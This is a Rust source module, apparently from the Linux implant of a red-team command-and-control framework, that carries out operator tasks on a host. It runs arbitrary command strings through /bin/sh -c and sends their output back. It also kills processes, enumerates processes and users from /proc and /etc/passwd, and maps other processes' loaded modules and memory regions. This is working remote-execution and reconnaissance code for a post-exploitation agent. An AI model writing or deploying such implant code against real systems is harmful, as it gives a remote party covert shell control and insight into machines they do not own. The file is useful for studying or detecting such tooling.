//! `CommandProcList` / `CommandProc`: process listing and management.

use std::collections::BTreeMap;
use std::ffi::OsString;
use std::fs;
use std::path::{Path, PathBuf};
use std::process::Stdio;

use std::os::unix::fs::MetadataExt;

use red_cell_common::demon::{DemonCommand, DemonProcessCommand};
use tokio::process::Command;

use crate::error::PhantomError;
use crate::parser::TaskParser;
use crate::protocol::executable_name;

use super::encode::*;
use super::types::{MemoryRegion, PendingCallback, ProcessEntry};
use super::{io_error, PhantomState};

use super::sysinfo::{
    MEM_COMMIT, MEM_IMAGE, MEM_MAPPED, MEM_PRIVATE, PAGE_EXECUTE, PAGE_EXECUTE_READ,
    PAGE_EXECUTE_READWRITE, PAGE_EXECUTE_WRITECOPY, PAGE_NOACCESS, PAGE_READONLY, PAGE_READWRITE,
    PAGE_WRITECOPY,
};

/// List all processes on the system.
pub(super) fn execute_process_list(payload: &[u8]) -> Result<Vec<u8>, PhantomError> {
    let mut parser = TaskParser::new(payload);
    let process_ui = u32::try_from(parser.int32()?)
        .map_err(|_| PhantomError::TaskParse("negative process ui flag"))?;
    let processes = enumerate_processes()?;
    encode_process_list(process_ui, &processes)
}

/// Handle `CommandProc` subcommands: create, kill, grep, modules, memory.
pub(super) async fn execute_process(
    request_id: u32,
    payload: &[u8],
    state: &mut PhantomState,
) -> Result<(), PhantomError> {
    let mut parser = TaskParser::new(payload);
    let subcommand = u32::try_from(parser.int32()?)
        .map_err(|_| PhantomError::TaskParse("negative process subcommand"))?;
    let subcommand = DemonProcessCommand::try_from(subcommand)?;

    match subcommand {
        DemonProcessCommand::Create => {
            let _process_state = parser.int32()?;
            let process = parser.wstring()?;
            let process_args = parser.wstring()?;
            let piped = parser.bool32()?;
            let verbose = parser.bool32()?;

            let binary = if process.is_empty() { String::from("/bin/sh") } else { process };

            let mut command = Command::new(&binary);
            if process_args.is_empty() {
                if binary == "/bin/sh" {
                    command.arg("-c").arg("true");
                }
            } else if binary == "/bin/sh" {
                command.arg("-c").arg(process_args);
            } else {
                command.args(split_args(&process_args));
            }
            if piped {
                command.stdout(Stdio::piped()).stderr(Stdio::piped());
                let child =
                    command.spawn().map_err(|error| PhantomError::Process(error.to_string()))?;
                let pid = child.id().unwrap_or_default();
                let output = child
                    .wait_with_output()
                    .await
                    .map_err(|error| PhantomError::Process(error.to_string()))?;
                state.queue_callback(PendingCallback::Structured {
                    command_id: u32::from(DemonCommand::CommandProc),
                    request_id,
                    payload: encode_proc_create(&binary, pid, true, true, verbose)?,
                });
                let mut merged = String::from_utf8_lossy(&output.stdout).into_owned();
                if !output.stderr.is_empty() {
                    if !merged.is_empty() {
                        merged.push('\n');
                    }
                    merged.push_str(&String::from_utf8_lossy(&output.stderr));
                }
                state.queue_callback(PendingCallback::Output { request_id, text: merged });
            } else {
                let child =
                    command.spawn().map_err(|error| PhantomError::Process(error.to_string()))?;
                state.queue_callback(PendingCallback::Structured {
                    command_id: u32::from(DemonCommand::CommandProc),
                    request_id,
                    payload: encode_proc_create(
                        &binary,
                        child.id().unwrap_or_default(),
                        true,
                        false,
                        verbose,
                    )?,
                });
            }
        }
        DemonProcessCommand::Kill => {
            let pid = u32::try_from(parser.int32()?)
                .map_err(|_| PhantomError::TaskParse("negative pid"))?;
            let success = Command::new("kill")
                .arg("-9")
                .arg(pid.to_string())
                .status()
                .await
                .map_err(|error| PhantomError::Process(error.to_string()))?
                .success();
            state.queue_callback(PendingCallback::Structured {
                command_id: u32::from(DemonCommand::CommandProc),
                request_id,
                payload: encode_proc_kill(success, pid),
            });
        }
        DemonProcessCommand::Grep => {
            let needle = parser.wstring()?.to_lowercase();
            let filtered = enumerate_processes()?
                .into_iter()
                .filter(|process| process.name.to_lowercase().contains(&needle))
                .collect::<Vec<_>>();
            state.queue_callback(PendingCallback::Structured {
                command_id: u32::from(DemonCommand::CommandProc),
                request_id,
                payload: encode_proc_grep(&filtered)?,
            });
        }
        DemonProcessCommand::Modules => {
            let pid = u32::try_from(parser.int32()?)
                .map_err(|_| PhantomError::TaskParse("negative pid"))?;
            let modules = enumerate_modules(pid)?;
            state.queue_callback(PendingCallback::Structured {
                command_id: u32::from(DemonCommand::CommandProc),
                request_id,
                payload: encode_proc_modules(pid, &modules)?,
            });
        }
        DemonProcessCommand::Memory => {
            let pid = u32::try_from(parser.int32()?)
                .map_err(|_| PhantomError::TaskParse("negative pid"))?;
            let query_protection = u32::try_from(parser.int32()?)
                .map_err(|_| PhantomError::TaskParse("negative query protection"))?;
            let regions = enumerate_memory_regions(pid, query_protection)?;
            state.queue_callback(PendingCallback::Structured {
                command_id: u32::from(DemonCommand::CommandProc),
                request_id,
                payload: encode_proc_memory(pid, query_protection, &regions),
            });
        }
    }

    Ok(())
}

// ---------------------------------------------------------------------------
// Process enumeration helpers
// ---------------------------------------------------------------------------

pub(super) fn enumerate_processes() -> Result<Vec<ProcessEntry>, PhantomError> {
    let mut processes = Vec::new();
    for entry in fs::read_dir("/proc").map_err(|error| io_error("/proc", error))? {
        let entry = entry.map_err(|error| io_error("/proc", error))?;
        let file_name = entry.file_name();
        let Some(pid) = file_name.to_str().and_then(|value| value.parse::<u32>().ok()) else {
            continue;
        };
        match read_process_entry(pid) {
            Ok(process) => processes.push(process),
            Err(PhantomError::Io { message, .. })
                if message.contains("No such file or directory") =>
            {
                continue;
            }
            Err(error) => return Err(error),
        }
    }
    processes.sort_by(|left, right| left.pid.cmp(&right.pid));
    Ok(processes)
}

fn read_process_entry(pid: u32) -> Result<ProcessEntry, PhantomError> {
    let proc_path = PathBuf::from(format!("/proc/{pid}"));
    let status = fs::read_to_string(proc_path.join("status"))
        .map_err(|error| io_error(proc_path.join("status"), error))?;
    let metadata = fs::metadata(&proc_path).map_err(|error| io_error(&proc_path, error))?;
    let name = status_field(&status, "Name").map(str::to_owned).unwrap_or_else(|| pid.to_string());
    let parent_pid = status_field(&status, "PPid")
        .and_then(|value| value.parse::<u32>().ok())
        .unwrap_or_default();
    let threads =
        status_field(&status, "Threads").and_then(|value| value.parse::<u32>().ok()).unwrap_or(1);
    let session = read_process_session(pid).unwrap_or_default();
    let exe = fs::read_link(proc_path.join("exe")).unwrap_or_else(|_| PathBuf::from(&name));
    let is_wow64 = process_arch_bits(&exe).unwrap_or(64) == 32;

    Ok(ProcessEntry {
        name: executable_name(&exe),
        pid,
        parent_pid,
        session,
        threads,
        user: username_for_uid(metadata.uid()),
        is_wow64,
    })
}

fn status_field<'a>(status: &'a str, field: &str) -> Option<&'a str> {
    status.lines().find_map(|line| {
        line.strip_prefix(field).and_then(|value| value.strip_prefix(':')).map(str::trim)
    })
}

fn read_process_session(pid: u32) -> Option<u32> {
    let stat = fs::read_to_string(format!("/proc/{pid}/stat")).ok()?;
    let suffix = stat.split_once(") ")?.1;
    let fields = suffix.split_whitespace().collect::<Vec<_>>();
    fields.get(3)?.parse::<u32>().ok()
}

fn process_arch_bits(exe: &Path) -> Option<u32> {
    let header = fs::read(exe).ok()?;
    if header.len() < 5 || &header[..4] != b"\x7FELF" {
        return None;
    }
    match header[4] {
        1 => Some(32),
        2 => Some(64),
        _ => None,
    }
}

fn username_for_uid(uid: u32) -> String {
    fs::read_to_string("/etc/passwd")
        .ok()
        .and_then(|passwd| {
            passwd.lines().find_map(|line| {
                let mut fields = line.split(':');
                let username = fields.next()?;
                let _password = fields.next()?;
                let entry_uid = fields.next()?.parse::<u32>().ok()?;
                (entry_uid == uid).then(|| username.to_string())
            })
        })
        .unwrap_or_else(|| uid.to_string())
}

pub(super) fn enumerate_modules(pid: u32) -> Result<Vec<(String, u64)>, PhantomError> {
    let maps_path = if pid == 0 {
        PathBuf::from("/proc/self/maps")
    } else {
        PathBuf::from(format!("/proc/{pid}/maps"))
    };
    let contents = fs::read_to_string(&maps_path).map_err(|error| io_error(&maps_path, error))?;
    let mut modules = BTreeMap::new();
    for line in contents.lines() {
        let mut parts = line.split_whitespace();
        let Some(range) = parts.next() else {
            continue;
        };
        let path = parts.nth(4).unwrap_or_default();
        if path.is_empty() || !path.starts_with('/') {
            continue;
        }
        let Some((base, _)) = range.split_once('-') else {
            continue;
        };
        let Ok(base_addr) = u64::from_str_radix(base, 16) else {
            continue;
        };
        modules.entry(path.to_string()).or_insert(base_addr);
    }
    Ok(modules.into_iter().collect())
}

pub(super) fn enumerate_memory_regions(
    pid: u32,
    query_protection: u32,
) -> Result<Vec<MemoryRegion>, PhantomError> {
    let maps_path = if pid == 0 {
        PathBuf::from("/proc/self/maps")
    } else {
        PathBuf::from(format!("/proc/{pid}/maps"))
    };
    let contents = fs::read_to_string(&maps_path).map_err(|error| io_error(&maps_path, error))?;
    let mut regions = contents
        .lines()
        .filter_map(parse_memory_region)
        .filter(|region| query_protection == 0 || region.protect == query_protection)
        .collect::<Vec<_>>();
    regions.sort_by(|left, right| left.base.cmp(&right.base));
    Ok(regions)
}

pub(super) fn parse_memory_region(line: &str) -> Option<MemoryRegion> {
    let fields = line.split_whitespace().collect::<Vec<_>>();
    let range = *fields.first()?;
    let perms = *fields.get(1)?;
    let path = fields.get(5).copied();
    let (start, end) = range.split_once('-')?;
    let base = u64::from_str_radix(start, 16).ok()?;
    let end = u64::from_str_radix(end, 16).ok()?;
    let size = u32::try_from(end.checked_sub(base)?).ok()?;
    let protect = map_linux_protection(perms);
    let mem_type = map_linux_memory_type(perms, path);
    Some(MemoryRegion { base, size, protect, state: MEM_COMMIT, mem_type })
}

pub(super) fn map_linux_protection(perms: &str) -> u32 {
    match perms.as_bytes() {
        [b'-', b'-', b'-', b'-', ..] => PAGE_NOACCESS,
        [b'r', b'-', b'-', b'-', ..] => PAGE_READONLY,
        [b'r', b'w', b'-', b'p', ..] => PAGE_READWRITE,
        [b'r', b'w', b'-', b's', ..] => PAGE_WRITECOPY,
        [b'-', b'-', b'x', b'-', ..] => PAGE_EXECUTE,
        [b'r', b'-', b'x', b'p', ..] | [b'r', b'-', b'x', b's', ..] => PAGE_EXECUTE_READ,
        [b'r', b'w', b'x', b'p', ..] => PAGE_EXECUTE_READWRITE,
        [b'r', b'w', b'x', b's', ..] => PAGE_EXECUTE_WRITECOPY,
        [b'-', b'w', b'-', b'p', ..] | [b'-', b'w', b'-', b's', ..] => PAGE_READWRITE,
        [b'-', b'w', b'x', b'p', ..] => PAGE_EXECUTE_READWRITE,
        [b'-', b'w', b'x', b's', ..] => PAGE_EXECUTE_WRITECOPY,
        [b'-', b'-', b'x', b'p', ..] | [b'-', b'-', b'x', b's', ..] => PAGE_EXECUTE,
        _ => PAGE_NOACCESS,
    }
}

pub(super) fn map_linux_memory_type(perms: &str, path: Option<&str>) -> u32 {
    match path {
        Some(path) if path.starts_with('/') => {
            if perms.contains('x') {
                MEM_IMAGE
            } else {
                MEM_MAPPED
            }
        }
        _ => MEM_PRIVATE,
    }
}

pub(super) fn split_args(arguments: &str) -> Vec<OsString> {
    arguments.split_whitespace().filter(|value| !value.is_empty()).map(OsString::from).collect()
}
